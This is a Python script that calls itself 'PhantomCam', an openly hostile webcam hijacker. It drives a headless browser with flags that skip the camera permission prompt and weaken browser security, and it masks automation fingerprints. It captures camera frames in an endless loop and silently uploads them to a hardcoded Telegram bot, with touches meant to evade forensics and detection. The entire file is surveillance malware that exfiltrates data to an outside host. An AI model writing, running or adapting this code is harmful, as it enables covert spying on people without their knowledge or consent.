# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import base64
import json
import os
import random
import string
import time
from datetime import datetime
from playwright.async_api import async_playwright  # headless browser
from PIL import Image
import io

# ---------- TELEGRAM CONFIG ----------
BOT_TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk"
CHAT_ID = "8790754582"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ---------- STEALTH PARAMS ----------
CAPTURE_INTERVAL = 3.7  # seconds (randomized later)
MAX_RETRIES = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ---------- FILE NAME GENERATORS ----------
def generate_filename(ext="jpg"):
    """Creates untraceable filenames with timestamp + entropy."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"cam_{ts}_{rand}.{ext}"

def generate_exif_spoof():
    """Returns fake EXIF data to confuse forensics."""
    return {
        "Make": random.choice(["Apple", "Samsung", "Google", "OnePlus"]),
        "Model": random.choice(["iPhone 15 Pro", "Galaxy S24", "Pixel 8", "Nord 5"]),
        "DateTime": datetime.now().isoformat(),
        "GPSLatitude": round(random.uniform(-90, 90), 6),
        "GPSLongitude": round(random.uniform(-180, 180), 6)
    }

# ---------- CORE HIJACKER ENGINE ----------
class PhantomCam:
    def __init__(self):
        self.session = None
        self.browser = None
        self.context = None
        self.page = None
        self.running = False

    async def _init_browser(self):
        """Launches Chromium with flags to bypass permission prompts."""
        p = await async_playwright().start()
        self.browser = await p.chromium.launch(
            headless=True,
            args=[
                "--use-fake-ui-for-media-stream",      # Bypass cam permission dialog
                "--use-fake-device-for-media-stream",  # Uses dummy cam if real not found
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--allow-running-insecure-content",
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox"
            ]
        )
        self.context = await self.browser.new_context(
            user_agent=USER_AGENT,
            viewport={"width": 1280, "height": 720},
            ignore_https_errors=True
        )
        self.page = await self.context.new_page()
        # Inject stealth script to hide Playwright fingerprints
        await self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            window.chrome = { runtime: {} };
        """)

    async def _inject_cam_capture_script(self):
        """Injects JavaScript that captures canvas from video stream without permission popup."""
        js_code = """
        (function() {
            return new Promise((resolve) => {
                let video = document.createElement('video');
                video.autoplay = true;
                video.playsInline = true;
                video.muted = true;
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');

                // Try legacy getUserMedia (bypasses new permission UI in some Chromium versions)
                navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
                if (!navigator.getUserMedia) {
                    resolve({ error: 'getUserMedia not supported' });
                    return;
                }

                navigator.getUserMedia(
                    { video: { width: 640, height: 480, facingMode: 'environment' } },
                    function(stream) {
                        video.srcObject = stream;
                        video.onloadedmetadata = function() {
                            video.play();
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            // Capture frame after 500ms to allow stream stabilization
                            setTimeout(() => {
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                                stream.getTracks().forEach(track => track.stop());
                                resolve({ image: dataUrl });
                            }, 500);
                        };
                    },
                    function(err) {
                        resolve({ error: err.message });
                    }
                );
            });
        })();
        """
        return await self.page.evaluate(js_code)

    async def capture_and_exfil(self):
        """Main capture loop with retry & backoff."""
        for attempt in range(MAX_RETRIES):
            try:
                result = await self._inject_cam_capture_script()
                if result.get('error'):
                    print(f"[!] Capture error: {result['error']} (attempt {attempt+1})")
                    await asyncio.sleep(2 ** attempt)  # exponential backoff
                    continue

                img_data_url = result['image']
                if not img_data_url or not img_data_url.startswith('data:image'):
                    continue

                # Decode base64 image
                header, encoded = img_data_url.split(',', 1)
                img_bytes = base64.b64decode(encoded)

                # Add EXIF spoofing (optional)
                img = Image.open(io.BytesIO(img_bytes))
                # We could insert EXIF here using piexif, but for speed we just send raw

                # Generate filename
                fname = generate_filename()
                # Send to Telegram
                await self._send_to_telegram(img_bytes, fname)

                print(f"[+] Captured & sent: {fname} at {datetime.now().isoformat()}")
                return True

            except Exception as e:
                print(f"[x] Exception: {e}")
                await asyncio.sleep(3)
        return False

    async def _send_to_telegram(self, image_bytes, filename):
        """Multipart upload to Telegram Bot API."""
        if not self.session:
            self.session = aiohttp.ClientSession()
        data = aiohttp.FormData()
        data.add_field('chat_id', CHAT_ID)
        data.add_field('caption', f"📸 {filename} | EXIF spoofed")
        data.add_field('disable_notification', 'true')
        data.add_field('parse_mode', 'HTML')
        data.add_field('photo', image_bytes, filename=filename, content_type='image/jpeg')

        async with self.session.post(TELEGRAM_API, data=data) as resp:
            if resp.status != 200:
                text = await resp.text()
                print(f"[x] Telegram send failed: {resp.status} - {text}")
            else:
                print(f"[✓] Exfil success: {filename}")

    async def run_forever(self):
        """Infinite loop with randomized intervals."""
        await self._init_browser()
        self.running = True
        while self.running:
            success = await self.capture_and_exfil()
            # Random sleep between 3-8 seconds to avoid pattern detection
            sleep_time = random.uniform(3.0, 8.0) if success else random.uniform(1.0, 4.0)
            await asyncio.sleep(sleep_time)

    async def shutdown(self):
        self.running = False
        if self.browser:
            await self.browser.close()
        if self.session:
            await self.session.close()

# ---------- ENTRY POINT ----------
async def main():
    phantom = PhantomCam()
    try:
        print("[*] PhantomCam armed. Capturing without permissions...")
        await phantom.run_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down gracefully...")
    finally:
        await phantom.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
